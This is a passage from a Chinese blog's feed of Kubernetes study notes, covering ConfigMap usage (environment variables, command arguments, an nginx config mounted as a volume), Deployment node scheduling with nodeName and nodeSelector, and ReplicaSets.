中的信息</h2><h3 id="通过环境变量调用"><a href="#通过环境变量调用" class="headerlink" title="通过环境变量调用"></a>通过环境变量调用</h3><p>假设已经创建了一个 ConfigMap, 信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  name: special-config</span><br><span class="line">  namespace: default</span><br><span class="line">data:</span><br><span class="line">  special.how: very</span><br><span class="line">  special.type: charm</span><br></pre></td></tr></table></figure><p>定义 pod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">    - name: test-container</span><br><span class="line">      image: busybox</span><br><span class="line">      command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;env&quot;]</span><br><span class="line">      env:</span><br><span class="line">        - name: SPECIAL_LEVEL_KEY</span><br><span class="line">          valueFrom:</span><br><span class="line">            configMapKeyRef:</span><br><span class="line">              name: special-config</span><br><span class="line">              key: special.how</span><br><span class="line">        - name: SPECIAL_TYPE_KEY</span><br><span class="line">          valueFrom:</span><br><span class="line">            configMapKeyRef:</span><br><span class="line">              name: special-config</span><br><span class="line">              key: special.type</span><br><span class="line">  restartPolicy: Never</span><br></pre></td></tr></table></figure><p>pod 启动后会输出所有的环境变量信息，其中包括:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SPECIAL_LEVEL_KEY=very</span><br><span class="line">SPECIAL_TYPE_KEY=charm</span><br></pre></td></tr></table></figure><h3 id="设置命令行参数"><a href="#设置命令行参数" class="headerlink" title="设置命令行参数"></a>设置命令行参数</h3><p>configmap 还可以通过命令行注入，用户可以通过 <code>$(VAR_NAME)</code>方式调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">    - name: test-container</span><br><span class="line">      image: busybox</span><br><span class="line">      command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo $(SPECIAL_LEVEL_KEY) $(SPECIAL_TYPE_KEY)&quot;]</span><br><span class="line">      env:</span><br><span class="line">        - name: SPECIAL_LEVEL_KEY</span><br><span class="line">          valueFrom:</span><br><span class="line">            configMapKeyRef:</span><br><span class="line">              name: special-config</span><br><span class="line">              key: special.how</span><br><span class="line">        - name: SPECIAL_TYPE_KEY</span><br><span class="line">          valueFrom:</span><br><span class="line">            configMapKeyRef:</span><br><span class="line">              name: special-config</span><br><span class="line">              key: special.type</span><br><span class="line">  restartPolicy: Never</span><br></pre></td></tr></table></figure><h3 id="volume-plugin"><a href="#volume-plugin" class="headerlink" title="volume plugin"></a>volume plugin</h3><p>这是 configmap 最核心的用法，最基本的是通过文件名指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-conf</span><br><span class="line">data:</span><br><span class="line">  nginx.conf: |</span><br><span class="line">    user nginx;</span><br><span class="line">    worker_processes  3;</span><br><span class="line">    error_log  /var/log/nginx/error.log;</span><br><span class="line">    events &#123;</span><br><span class="line">      worker_connections  10240;</span><br><span class="line">    &#125;</span><br><span class="line">    http &#123;</span><br><span class="line">      log_format  main</span><br><span class="line">              &apos;remote_addr:$remote_addr\t&apos;</span><br><span class="line">              &apos;time_local:$time_local\t&apos;</span><br><span class="line">              &apos;method:$request_method\t&apos;</span><br><span class="line">              &apos;uri:$request_uri\t&apos;</span><br><span class="line">              &apos;host:$host\t&apos;</span><br><span class="line">              &apos;status:$status\t&apos;</span><br><span class="line">              &apos;bytes_sent:$body_bytes_sent\t&apos;</span><br><span class="line">              &apos;referer:$http_referer\t&apos;</span><br><span class="line">              &apos;useragent:$http_user_agent\t&apos;</span><br><span class="line">              &apos;forwardedfor:$http_x_forwarded_for\t&apos;</span><br><span class="line">              &apos;request_time:$request_time&apos;;</span><br><span class="line">      access_log/var/log/nginx/access.log main;</span><br><span class="line">      server &#123;</span><br><span class="line">          listen       80;</span><br><span class="line">          server_name  _;</span><br><span class="line">          location / &#123;</span><br><span class="line">              root   html;</span><br><span class="line">              index  index.html index.htm;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      include /etc/nginx/virtualhost/virtualhost.conf;</span><br><span class="line">    &#125;</span><br><span class="line">    virtualhost.conf: |</span><br><span class="line">      upstream app &#123;</span><br><span class="line">        server localhost:8080;</span><br><span class="line">        keepalive 1024;</span><br><span class="line">      &#125;</span><br><span class="line">      server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        root /usr/local/app;</span><br><span class="line">        access_log /var/log/nginx/app.access_log main;</span><br><span class="line">        error_log /var/log/nginx/app.error_log;</span><br><span class="line">        location / &#123;</span><br><span class="line">          proxy_pass http://app/;</span><br><span class="line">          proxy_http_version 1.1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>pod 定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1beta1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /etc/nginx # mount nginx-conf volumn to /etc/nginx</span><br><span class="line">          readOnly: true</span><br><span class="line">          name: nginx-conf</span><br><span class="line">      volumes:</span><br><span class="line">      - name: nginx-conf</span><br><span class="line">        configMap:</span><br><span class="line">          name: nginx-conf # place ConfigMap `nginx-conf` on /etc/nginx</span><br><span class="line">          items:</span><br><span class="line">            - key: nginx.conf</span><br><span class="line">              path: nginx.conf</span><br><span class="line">            - key: virtualhost.conf</span><br><span class="line">              path: virtualhost/virtualhost.conf # dig directory</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很多生产环境中的应用程序较为复杂，可能需要多个 config 文件，命令行参数和环境变量的组合。并且这些配置信息应该从镜像中解耦出来，以保证镜像的可移植性以及配置信息不被泄漏。社区使用 ConfigMap 满足这一需求。&lt;/p&gt;
&lt;p&gt;ConfigMap 包含了一系列键值对，用于存储被 pod 或者系统组件（如 controller 等）访问的信息。&lt;/p&gt;
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之daemonset</title>
    <link href="http://yoursite.com/2018/11/21/k8s-daemonset/"/>
    <id>http://yoursite.com/2018/11/21/k8s-daemonset/</id>
    <published>2018-11-21T01:56:27.000Z</published>
    <updated>2018-11-21T02:51:47.556Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之deployment</title>
    <link href="http://yoursite.com/2018/11/21/k8s-deployment/"/>
    <id>http://yoursite.com/2018/11/21/k8s-deployment/</id>
    <published>2018-11-21T01:56:12.000Z</published>
    <updated>2018-11-21T08:57:55.901Z</updated>
    
    <content type="html"><![CDATA[<p>Deployment 多用于为 pod 和 replia set 提供更新，并且可以方便地跟踪观察其所属的 replica set 或者 pod 数量以及状态的变化。</p><a id="more"></a><h2 id="Node-调度"><a href="#Node-调度" class="headerlink" title="Node 调度"></a>Node 调度</h2><p>有时候我们希望 pod 运行在指定的一个或者一批 node 上。可以通过 node 的名字或者 label 来完成。</p><h2 id="NodeName"><a href="#NodeName" class="headerlink" title="NodeName"></a>NodeName</h2><p>Pod.spec.nodeName用于强制约束将Pod调度到指定的Node节点上，这里说是“调度”，但其实指定了nodeName的Pod会直接跳过Scheduler的调度逻辑，直接写入PodList列表，该匹配规则是强制匹配。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: my-deploy</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: my-app</span><br><span class="line">    spec:</span><br><span class="line">      nodeName: master # 指定调度到master节点</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br></pre></td></tr></table></figure><h3 id="NodeSelector"><a href="#NodeSelector" class="headerlink" title="NodeSelector"></a>NodeSelector</h3><ul><li>Pod.spec.nodeSelector是通过kubernetes的label-selector机制进行节点选择，由scheduler调度策略</li><li>MatchNodeSelector进行label匹配，调度pod到目标节点，该匹配规则是强制约束。</li></ul><h4 id="查看节点-label"><a href="#查看节点-label" class="headerlink" title="查看节点 label"></a>查看节点 label</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes --show-labels</span><br></pre></td></tr></table></figure><h4 id="添加-label"><a href="#添加-label" class="headerlink" title="添加 label"></a>添加 label</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl label nodes &lt;node_name&gt; &lt;key&gt;=&lt;value&gt;</span><br><span class="line"></span><br><span class="line"># eg:</span><br><span class="line">kubectl label nodes master region=shanghai</span><br></pre></td></tr></table></figure><h4 id="pod-中指定-label"><a href="#pod-中指定-label" class="headerlink" title="pod 中指定 label"></a>pod 中指定 label</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: my-deploy</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: my-app</span><br><span class="line">    spec:</span><br><span class="line">      nodeSelector:</span><br><span class="line">        region: shanghai # 指定调度到上海的节点</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Deployment 多用于为 pod 和 replia set 提供更新，并且可以方便地跟踪观察其所属的 replica set 或者 pod 数量以及状态的变化。&lt;/p&gt;
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之Replica Sets</title>
    <link href="http://yoursite.com/2018/11/21/k8s-rs/"/>
    <id>http://yoursite.com/2018/11/21/k8s-rs/</id>
    <published>2018-11-21T01:56:06.000Z</published>
    <updated>2018-12-05T02:15:24.471Z</updated>
    
    <content type="html"><![CDATA[<p>ReplicaSet 是下一代的Replication Controller.一个 ReplicaSet 和一个 Replication Controller 之间唯一的不同目前是对选择器的支持. ReplicaSet 支持最新的基于集合的选择器需求,这描述在标签用户指南然而一个Replication Controller 仅仅支持基于等号的选择器需求.</p><a id="more"></a><p>大部分的kubectl命令不仅支持Replication Controllers也支持ReplicaSets.一个例外是rolling-update命令. 如果你想功能上滚动升级,请考虑使用Deployments来替代.并且rolling-update是命令式的而Deployments则是陈述式的,所以我们推荐 通过rollout这个命令来使用Deployments.</p><p>当ReplicaSets能够被独立地使用的时候,今天它主要地被用在Deployments上作为精心策划pod创建,删除和升级的一个机制.当你使用Deployments的时候,你无需去 担心Deployments建立的ReplicaSets怎么去管理.Deployments 拥有和管理他们自己的ReplicaSets.</p><h2 id="使用-ReplicaSet"><a href="#使用-ReplicaSet" class="headerlink" title="使用 ReplicaSet"></a>使用 ReplicaSet</h2><p>一个ReplicaSet保证pod副本为一个指定的数目在给定的任何时间内.然而,一个Deployment是一个更高级别的概念来去管理ReplicaSets 和提供描述性的pods升级以及很多其他有用的特性.因此,我们推荐使用Deployments来替代直接使用ReplicaSets,除非你需要定制的更新编排 或者一点也不需要更新. 这个事实上意味着你可能从不需要操作ReplicaSet对象： 直接使用一个Deployment然后在声明部分定义你的应用.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ReplicaSet 是下一代的Replication Controller.一个 ReplicaSet 和一个 Replication Controller 之间唯一的不同目前是对选择器的支持. ReplicaSet 支持最新的基于集合的选择器需求,这描述在标签用户指南然而一个Replication Controller 仅仅支持基于等号的选择器需求.&lt;/p&gt;
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之rc</title>
    <link href="http://yoursite.com/2018/11/21/k8s-rc/"/>
    <id>http://yoursite.com/2018/11/21/k8s-rc/</id>
    <published>2018-11-21T01:55:57.000Z</published>
    <updated>2018-11-21T02:51:38.495Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
</feed>
